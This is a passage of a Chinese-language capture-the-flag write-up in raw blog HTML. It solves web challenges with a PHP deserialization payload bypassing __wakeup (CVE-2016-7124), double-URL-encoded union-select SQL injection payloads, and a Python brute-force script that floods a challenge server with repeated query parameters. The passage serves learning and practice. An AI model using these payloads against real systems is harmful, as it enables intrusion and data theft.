class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ser_code=<span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser_code</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;SER&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_code</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ouo</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$ser_code</span> = <span class="hljs-string">&quot;FLAG&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> ouo;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>CVE-2016-7124绕过wakeup</p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ouo%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>ouo%<span class="hljs-number">00</span>ser_code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FLAG%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D&#123;flag&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009346.png" alt="image-20221218123424361"></p><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009347.png" alt="image-20221218211546614"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;db.inc.php&#x27;</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data </span>= <span class="hljs-title function_ invoke__">p</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$id </span>= <span class="hljs-keyword">string</span>::<span class="hljs-title function_ invoke__">delHtml</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>    <span class="hljs-variable">$id </span>= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$id</span>);<br><br>    <span class="hljs-variable">$conn </span>= <span class="hljs-keyword">new</span><span class="hljs-title function_ invoke__"> mysqli</span>(DB_HOST, DB_USER, DB_PWD, DB_NAME);<br>    <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_error);<br>    &#125;<br>    <span class="hljs-variable">$sql </span>= <span class="hljs-string">&quot;SELECT id, name, email FROM users where id = &#x27;<span class="hljs-subst">$id</span>&#x27; limit 1&quot;</span>;<br><br>    <span class="hljs-variable">$result </span>= <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">while</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$row </span>= <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;Name: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;email&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;0 结果&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$conn</span>-&gt;error);<br>    &#125;<br><br>    <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>参数-&gt;string::delHtml-&gt;urldecode</p><p>有一个urldecode，可能有用，尝试二重url编码单引号发现能引发报错</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%2527<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009348.png" alt="image-20221218210823599"></p><p>直接输入单引号一点用处都没有，可能是经过string::delHtml的处理，但是urldecode函数在转义过程之后，所以可用双重url编码绕过。</p><p>剩下的就是普通的联合查询注入。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?id=<span class="hljs-number">0</span><span class="hljs-symbol">%</span><span class="hljs-number">2527</span>%2Bunion%2Bselect%<span class="hljs-number">2B1</span>%2C2%2C3%<span class="hljs-number">2523</span><br>?id=<span class="hljs-number">0</span>%2527union%2Bselect%<span class="hljs-number">2B1</span>%2C2%2Cdatabase()%2B%<span class="hljs-number">2523</span><br><br>sqlll<br><span class="hljs-number">10.1</span><span class="hljs-number">.48</span>-MariaDB-<span class="hljs-number">0</span>+deb9u2<br></code></pre></td></tr></table></figure><p>查表名</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">0</span><span class="hljs-meta">%2527union</span><span class="hljs-meta">%2Bselect</span><span class="hljs-meta">%2B1</span><span class="hljs-meta">%2C2</span><span class="hljs-meta">%2Cgroup_concat</span>(table_name)from<span class="hljs-meta">%2Binformation_schema</span>.tables<span class="hljs-meta">%2Bwhere</span><span class="hljs-meta">%2Btable_schema</span><span class="hljs-meta">%3Ddatabase</span>()<span class="hljs-meta">%2B</span><span class="hljs-meta">%2523</span><br><br>is_this_flag,users<br></code></pre></td></tr></table></figure><p>查列名</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">0</span><span class="hljs-meta">%2527union</span><span class="hljs-meta">%2Bselect</span><span class="hljs-meta">%2B1</span><span class="hljs-meta">%2C2</span><span class="hljs-meta">%2Cgroup_concat</span>(column_name)from<span class="hljs-meta">%2Binformation_schema</span>.columns<span class="hljs-meta">%2Bwhere</span><span class="hljs-meta">%2Btable_name</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%2527is_this_flag</span><span class="hljs-meta">%2527</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2523</span><br><br>flag<br></code></pre></td></tr></table></figure><p>查flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?id=<span class="hljs-number">0</span>%2527union%2Bselect%<span class="hljs-number">2B1</span>%2C2%2Cgroup_concat(flag)from%2Bis_this_flag%2B%<span class="hljs-number">2523</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009349.png" alt="image-20221218211459068"></p><h2 id="skip"><a href="#skip" class="headerlink" title="skip"></a>skip</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009350.png" alt="image-20221218211726406"></p><p>run.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> app = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>)();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> ?? <span class="hljs-string">&quot;SECCON&#123;dummy&#125;&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">query</span>)<br>  req.<span class="hljs-property">query</span>.<span class="hljs-property">proxy</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;nginx&quot;</span>)<br>    ? res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Access here directly, not via nginx :(&quot;</span>)<br>    : res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Congratz! You got a flag: <span class="hljs-subst">$&#123;FLAG&#125;</span>`</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-variable constant_">PORT</span>, <span class="hljs-attr">host</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span> &#125;, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server listening at <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>需要给proxy赋值，只要不为nginx就可以输出flag，只传proxy参数不行，必须有多个参数才能使req.query.proxy等于传入参数，但是单个参数又不够，所以又写了一脚本爆破，最终得到flag。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>,<span class="hljs-number">1000</span>):<br>burp0_url = <span class="hljs-string">&#x27;http://59.110.213.14:45319/?&#x27;</span>+<span class="hljs-string">&#x27;x=1&amp;&#x27;</span>*i+<span class="hljs-string">&#x27;proxy=end&#x27;</span>;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>&#125;<br>s=requests.get(burp0_url, headers=burp0_headers)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(burp0_url)<br><span class="hljs-built_in">print</span>(s.text)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009351.png" alt="image-20221218205320815"></p><p>payload：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span class="hljs-variable">&amp;x</span>=1<span 